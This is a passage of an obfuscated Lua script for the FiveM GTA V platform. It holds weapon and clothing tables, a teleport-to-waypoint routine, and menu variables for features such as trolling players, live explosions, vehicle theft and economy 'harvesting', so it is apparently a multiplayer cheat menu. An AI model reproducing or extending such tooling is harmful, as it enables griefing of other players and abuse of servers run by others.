            id = "weapon_heavysniper_mk2",
            name = "Heavy Sniper Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},
                    {name = "Incendiary Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},
                    {name = "Armor Piercing Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},
                    {name = "Explosive Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"}
                },
                Sights = {
                    {name = "Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_MK2"},
                    {name = "Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"},
                    {name = "Nigt Vision Scope", id = "COMPONENT_AT_SCOPE_NV"},
                    {name = "Thermal Scope", id = "COMPONENT_AT_SCOPE_THERMAL"}
                },
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_SR_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_SR_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "Suppressor", id = "COMPONENT_AT_SR_SUPP_03"},
                    {name = "Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"},
                    {name = "Bell-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_09"}
                }
            }
        },
        MarksmanRifle = {
            id = "weapon_marksmanrifle",
            name = "Marksman Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_02"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        MarksmanRifleMkII = {
            id = "weapon_marksmanrifle_mk2",
            name = "Marksman Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ     "}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"},
                    {name = "Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_MRFL_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_MRFL_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        }
    },
    Heavy = {
        RPG = {id = "weapon_rpg", name = "RPG", bInfAmmo = false, mods = {}},
        GrenadeLauncher = {id = "weapon_grenadelauncher", name = "Grenade Launcher", bInfAmmo = false, mods = {}},
        GrenadeLauncherSmoke = {
            id = "weapon_grenadelauncher_smoke",
            name = "Grenade Launcher Smoke",
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {id = "weapon_minigun", name = "Minigun", bInfAmmo = false, mods = {}},
        FireworkLauncher = {id = "weapon_firework", name = "Firework Launcher", bInfAmmo = false, mods = {}},
        Railgun = {id = "weapon_railgun", name = "Railgun", bInfAmmo = false, mods = {}},
        HomingLauncher = {id = "weapon_hominglauncher", name = "Homing Launcher", bInfAmmo = false, mods = {}},
        CompactGrenadeLauncher = {
            id = "weapon_compactlauncher",
            name = "Compact Grenade Launcher",
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {id = "weapon_rayminigun", name = "Widowmaker", bInfAmmo = false, mods = {}}
    },
    Throwables = {
        Grenade = {id = "weapon_grenade", name = "Grenade", bInfAmmo = false, mods = {}},
        BZGas = {id = "weapon_bzgas", name = "BZ Gas", bInfAmmo = false, mods = {}},
        MolotovCocktail = {id = "weapon_molotov", name = "Molotov Cocktail", bInfAmmo = false, mods = {}},
        StickyBomb = {id = "weapon_stickybomb", name = "Sticky Bomb", bInfAmmo = false, mods = {}},
        ProximityMines = {id = "weapon_proxmine", name = "Proximity Mines", bInfAmmo = false, mods = {}},
        Snowballs = {id = "weapon_snowball", name = "Snowballs", bInfAmmo = false, mods = {}},
        PipeBombs = {id = "weapon_pipebomb", name = "Pipe Bombs", bInfAmmo = false, mods = {}},
        Baseball = {id = "weapon_ball", name = "Baseball", bInfAmmo = false, mods = {}},
        TearGas = {id = "weapon_smokegrenade", name = "Tear Gas", bInfAmmo = false, mods = {}},
        Flare = {id = "weapon_flare", name = "Flare", bInfAmmo = false, mods = {}}
    },
    Misc = {
        Parachute = {id = "gadget_parachute", name = "Parachute", bInfAmmo = false, mods = {}},
        FireExtinguisher = {id = "weapon_fireextinguisher", name = "Fire Extinguisher", bInfAmmo = false, mods = {}}
    }
}
local lEEdGdG3pKKZL5P7 = {
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL"
}
local G = {}
local B66 = {
    {name = "Engine", id = 11},
    {name = "Brakes", id = 12},
    {name = "Transmission", id = 13},
    {name = "Suspension", id = 15}
}
local function lRH(p0lE)
    local sj1 = GetPlayerPed(p0lE)
    SetPedRandomComponentVariation(sj1, false)
    SetPedRandomProps(sj1)
end
function kbinput(gb8oB8Wnj7hGdhk, o_cctjI3twoWrOc5, ERT8)
    AddTextEntry("FMMC_KEY_TIP1", gb8oB8Wnj7hGdhk .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", " ", o_cctjI3twoWrOc5, " ", " ", " ", ERT8)
    blockinput = true
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0.0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        local sfSSYLFF = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return sfSSYLFF
    else
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end
function WPTP()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local Gb0z7JVu = GetBlipInfoIdIterator(8)
        local q = GetFirstBlipInfoId(8, Gb0z7JVu)
        WaypointCoords = Citizen.InvokeNative(-397302983270703863, q, Citizen.ResultAsVector())
        wp = true
        local _pFC7R9SQd = nlXCUGaxh(0.0)
        local qatSRx = nlXCUGaxh(1000)
        while true do
            Citizen.Wait(0.0)
            if wp then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0.0) and
                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0.0), -1) == GetPlayerPed(-1))
                 then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0.0)
                else
                    entity = GetPlayerPed(-1)
                end
                SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, qatSRx)
                FreezeEntityPosition(entity, true)
                local q8oDigd6t = GetEntityCoords(entity, true)
                if _pFC7R9SQd == 0.0 then
                    qatSRx = qatSRx - nlXCUGaxh(25)
                    SetEntityCoords(entity, q8oDigd6t.x, q8oDigd6t.y, qatSRx)
                    bool, _pFC7R9SQd = GetGroundZFor_3dCoord(q8oDigd6t.x, q8oDigd6t.y, q8oDigd6t.z, 0.0)
                else
                    SetEntityCoords(entity, q8oDigd6t.x, q8oDigd6t.y, _pFC7R9SQd)
                    FreezeEntityPosition(entity, false)
                    wp = false
                    qatSRx = 1000
                    _pFC7R9SQd = 0.0
                    I0oW9H("Teleported")
                    break
                end
            end
        end
    else
        I0oW9H("Set a waypoint at map")
    end
end
currFastRunIndex = 1
selFastRunIndex = 1
currFastSwimIndex = 1
selFastSwimIndex = 1
FastCB = {1, 1.09, 1.19, 1.29, 1.39, 1.49}
FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}
FastRunMultiplier = nlXCUGaxh(1)
FastSwimMultiplier = nlXCUGaxh(1)
HealthCB = {200, 120, 140, 160, 180, 200}
HealthCBWords = {"0%", "20%", "40%", "60%", "80%", "100%"}
currHealthIndex = 1
selHealthIndex = 1
ArmorCB = {0.0, 20, 40, 60, 80, 100}
ArmorCBWords = {"0%", "20%", "40%", "60%", "80%", "100%"}
currArmorIndex = 1
selArmorIndex = 1
TorqueModOps = {1, 1.5, 2, 3, 5, 10, 20, 50, 100, 500, 1000}
SpeedModAmt = nlXCUGaxh(1)
currSpeedIndex = 1
selSpeedIndex = 1
currVFuncIndex = 1
selVFuncIndex = 1
DirtyCB = {0.0, 3, 6, 9, 12, 15}
DirtyCBWords = {"0%", "20%", "40%", "60%", "80%", "100%"}
currDirtyIndex = 1
selDirtyIndex = 1
currSoundFuncIndex = 1
selSoundFuncIndex = 1
currentTypeAmmo = 1
selectedTypeAmmo = 1
currentTypeExplosions = 1
selectedTypeExplosions = 1
currentFlagSelection = 1
selectedFlagSelection = 1
currentPlayerPropSelection = 1
selectedPlayerPropSelection = 1
currMiscPlayerFuncIndex = 1
selMiscPlayerFuncIndex = 1
currTrollPlayerFuncIndex = 1
selTrollPlayerFuncIndex = 1
currWeaponModFuncIndex = 1
selWeaponModFuncIndex = 1
currPokeAttackFuncIndex = 1
selPokeAttackFuncIndex = 1
currPokePedFuncIndex = 1
selPokePedFuncIndex = 1
currLiveTPFuncIndex = 1
selLiveTPFuncIndex = 1
currLiveExploFuncIndex = 1
selLiveExploFuncIndex = 1
currMyPedFuncIndex = 1
selMyPedFuncIndex = 1
currESXHarvestingFuncIndex = 1
selESXHarvestingFuncIndex = 1
currESXTransformFuncIndex = 1
selESXTransformFuncIndex = 1
currESXSellFuncIndex = 1
selESXSellFuncIndex = 1
currZoneBlockerFuncIndex = 1
selZoneBlockerFuncIndex = 1
currTireIndex = 1
selTireIndex = 1
currStealVehFuncIndex = 1
selStealVehFuncIndex = 1
currPedToShootFuncIndex = 1
selPedToShootFuncIndex = 1
currWeaponTintFuncIndex = 1
selWeaponTintFuncIndex = 1
currRampSelectionIndex = 1
selRampSelectionIndex = 1
local C6FFwY4tZ2K1_nr = 1
local TJ = 1
local skUTM47s1u_OJ7 = 1
local yJ1LbRvZem = 1
currWeaponSpecialFinishFuncIndex = 1
selWeaponSpecialFinishFuncIndex = 1
currDogDeleteSpawnFuncIndex = 1
selDogDeleteSpawnFuncIndex = 1
currDogPedFuncIndex = 1
selDogPedFuncIndex = 1
currDogAnimationFuncIndex = 1
selDogAnimationFuncIndex = 1
currBroomIndex = 1
selBroomIndex = 1
currSurfIndex = 1
selSurfIndex = 1
currSelectedCraftPropIndex = 1
selSelectedCraftPropIndex = 1
currSelectedXMovement = 1
selSelectedXMovement = 1
currSelectedYMovement = 1
selSelectedYMovement = 1
currSelectedZMovement = 1
selSelectedZMovement = 1
currSelectedHMovement = 1
selSelectedHMovement = 1
selMenuXPosition = 1
currMenuXPosition = 1
HatCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    68,
    69,
    70,
    71,
    72,
    73,
    74,
    75,
    76,
    77,
    78,
    79,
    80,
    81,
    82,
    83,
    84,
    85,
    86,
    87,
    88,
    89,
    90,
    100,
    101,
    102,
    103,
    104,
    105,
    106,
    107,
    108,
    109,
    110,
    111,
    112,
    113,
    114,
    115,
    116,
    117,
    118,
    119,
    121,
    122,
    123,
    124,
    125,
    126,
    127,
    128,
    129,
    130,
    131,
    132,
    133,
    134
}
HatCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67",
    "68",
    "69",
    "70",
    "71",
    "72",
    "73",
    "74",
    "75",
    "76",
    "77",
    "78",
    "79",
    "80",
    "81",
    "82",
    "83",
    "84",
    "85",
    "86",
    "87",
    "88",
    "89",
    "90",
    "100",
    "101",
    "102",
    "103",
    "104",
    "105",
    "106",
    "107",
    "108",
    "109",
    "110",
    "111",
    "112",
    "113",
    "114",
    "115",
    "116",
    "117",
    "118",
    "119",
    "121",
    "122",
    "123",
    "124",
    "125",
    "126",
    "127",
    "128",
    "129",
    "130",
    "131",
    "132",
    "133",
    "134"
}
currHatIndex = 1
selHatIndex = 1
HatexCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25}
HatexCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24"
}
currHatexIndex = 1
selHatexIndex = 1
GlassesCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27}
GlassesCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27"
}
currGlassesIndex = 1
selGlassesIndex = 1
GlassesexCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
GlassesexCBWords = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}
currGlassesexIndex = 1
selGlassesexIndex = 1
EarCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
EarCBWords = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}
currEarIndex = 1
selEarIndex = 1
EarexCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
EarexCBWords = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}
currEarexIndex = 1
selEarexIndex = 1
MaskCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    68,
    69,
    70,
    71,
    72,
    73,
    74,
    75,
    76,
    77,
    78,
    79,
    80,
    81,
    82,
    83,
    84,
    85,
    86,
    87,
    88,
    89,
    90,
    100,
    101,
    102,
    103,
    104,
    105,
    106,
    107,
    108,
    109,
    110,
    111,
    112,
    113,
    114,
    115,
    116,
    117,
    118,
    119,
    121,
    122,
    123,
    124,
    125,
    126,
    127,
    128,
    129,
    130,
    131,
    132,
    133,
    134,
    135,
    136,
    137,
    138,
    139,
    140,
    141,
    142,
    143,
    144,
    145,
    146
}
MaskCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67",
    "68",
    "69",
    "70",
    "71",
    "72",
    "73",
    "74",
    "75",
    "76",
    "77",
    "78",
    "79",
    "80",
    "81",
    "82",
    "83",
    "84",
    "85",
    "86",
    "87",
    "88",
    "89",
    "90",
    "100",
    "101",
    "102",
    "103",
    "104",
    "105",
    "106",
    "107",
    "108",
    "109",
    "110",
    "111",
    "112",
    "113",
    "114",
    "115",
    "116",
    "117",
    "118",
    "119",
    "121",
    "122",
    "123",
    "124",
    "125",
    "126",
    "127",
    "128",
    "129",
    "130",
    "131",
    "132",
    "133",
    "134",
    "135",
    "136",
    "137",
    "138",
    "139",
    "140",
    "141",
    "142",
    "143",
    "144",
    "145",
    "146"
}
currMaskIndex = 1
selMaskIndex = 1
MaskexCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25}
MaskexCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24"
}
currMaskexIndex = 1
selMaskexIndex = 1
HairCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22}
HairCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22"
}
currHairIndex = 1
selHairIndex = 1
HairexCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22}
HairexCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22"
}
currHairexIndex = 1
selHairexIndex = 1
TorsodosCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    68,
    69,
    70,
    71,
    72,
    73,
    74,
    75,
    76,
    77,
    78,
    79,
    80,
    81,
    82,
    83,
    84,
    85,
    86,
    87,
    88,
    89,
    90,
    100,
    101,
    102,
    103,
    104,
    105,
    106,
    107,
    108,
    109,
    110,
    111,
    112,
    113,
    114,
    115,
    116,
    117,
    118,
    119,
    121,
    122,
    123,
    124,
    125,
    126,
    127,
    128,
    129,
    130,
    131,
    132,
    133,
    134,
    135,
    136,
    137,
    138,
    139,
    140,
    141,
    142,
    143,
    144,
    145,
    146,
    147,
    148,
    149,
    150,
    151,
    152,
    153,
    154,
    155,
    156,
    157,
    158,
    159,
    160,
    161,
    162,
    163,
    164,
    165,
    167,
    168,
    169,
    170,
    171,
    172,
    173,
    174,
    175,
    176,
    177,
    178,
    179,
    180,
    181,
    182,
    183,
    184,
    185,
    186,
    187,
    188,
    189,
    190,
    191,
    192,
    193,
    194,
    195,
    196,
    197,
    198,
    199,
    200,
    201,
    202,
    203,
    204,
    205,
    216,
    207,
    208,
    209,
    210,
    211,
    212,
    213,
    214,
    215,
    216,
    217,
    218,
    219,
    221,
    222,
    223,
    224,
    225,
    226,
    227,
    228,
    229,
    230,
    231,
    232,
    233,
    234,
    235,
    236,
    237,
    238,
    239,
    240,
    241,
    242,
    243,
    244,
    245,
    246,
    247,
    248,
    249,
    250,
    251,
    252,
    253,
    254,
    255,
    256,
    257,
    258,
    259,
    260,
    261,
    262,
    263,
    264,
    265,
    267,
    268,
    269,
    270,
    271,
    272,
    273,
    274,
    275,
    276,
    277,
    278,
    279,
    280,
    281,
    282,
    283,
    284,
    285,
    286,
    287
}
TorsodosCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67",
    "68",
    "69",
    "70",
    "71",
    "72",
    "73",
    "74",
    "75",
    "76",
    "77",
    "78",
    "79",
    "80",
    "81",
    "82",
    "83",
    "84",
    "85",
    "86",
    "87",
    "88",
    "89",
    "90",
    "100",
    "101",
    "102",
    "103",
    "104",
    "105",
    "106",
    "107",
    "108",
    "109",
    "110",
    "111",
    "112",
    "113",
    "114",
    "115",
    "116",
    "117",
    "118",
    "119",
    "121",
    "122",
    "123",
    "124",
    "125",
    "126",
    "127",
    "128",
    "129",
    "130",
    "131",
    "132",
    "133",
    "134",
    "135",
    "136",
    "137",
    "138",
    "139",
    "140",
    "141",
    "142",
    "143",
    "144",
    "145",
    "146",
    "147",
    "148",
    "149",
    "150",
    "151",
    "152",
    "153",
    "154",
    "155",
    "156",
    "157",
    "158",
    "159",
    "160",
    "161",
    "162",
    "163",
    "164",
    "165",
    "166",
    "167",
    "168",
    "169",
    "170",
    "171",
    "172",
    "173",
    "174",
    "175",
    "176",
    "177",
    "178",
    "179",
    "180",
    "181",
    "182",
    "183",
    "184",
    "185",
    "186",
    "187",
    "188",
    "189",
    "190",
    "191",
    "192",
    "193",
    "194",
    "195",
    "196",
    "197",
    "198",
    "199",
    "200",
    "201",
    "202",
    "203",
    "204",
    "205",
    "206",
    "207",
    "208",
    "209",
    "210",
    "211",
    "212",
    "213",
    "214",
    "215",
    "216",
    "217",
    "218",
    "219",
    "221",
    "222",
    "223",
    "224",
    "225",
    "226",
    "227",
    "228",
    "229",
    "230",
    "231",
    "232",
    "233",
    "234",
    "235",
    "236",
    "237",
    "238",
    "239",
    "240",
    "241",
    "242",
    "243",
    "244",
    "245",
    "246",
    "247",
    "248",
    "249",
    "250",
    "251",
    "252",
    "253",
    "254",
    "255",
    "256",
    "257",
    "258",
    "259",
    "260",
    "261",
    "262",
    "263",
    "264",
    "265",
    "266",
    "267",
    "268",
    "269",
    "270",
    "271",
    "272",
    "273",
    "274",
    "275",
    "276",
    "277",
    "278",
    "279",
    "280",
    "281",
    "282",
    "283",
    "284",
    "285",
    "286",
    "287"
}
currTorsodosIndex = 1
selTorsodosIndex = 1
TorsodosexCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22}
TorsodosexCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22"
}
currTorsodosexIndex = 1
selTorsodosexIndex = 1
ShirtCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    68,
    69,
    70,
    71,
    72,
    73,
    74,
    75,
    76,
    77,
    78,
    79,
    80,
    81,
    82,
    83,
    84,
    85,
    86,
    87,
    88,
    89,
    90,
    100,
    101,
    102,
    103,
    104,
    105,
    106,
    107,
    108,
    109,
    110,
    111,
    112,
    113,
    114,
    115,
    116,
    117,
    118,
    119,
    121,
    122,
    123,
    124,
    125,
    126,
    127,
    128,
    129,
    130,
    131,
    132,
    133,
    134,
    135,
    136,
    137,
    138,
    139,
    140,
    141,
    142,
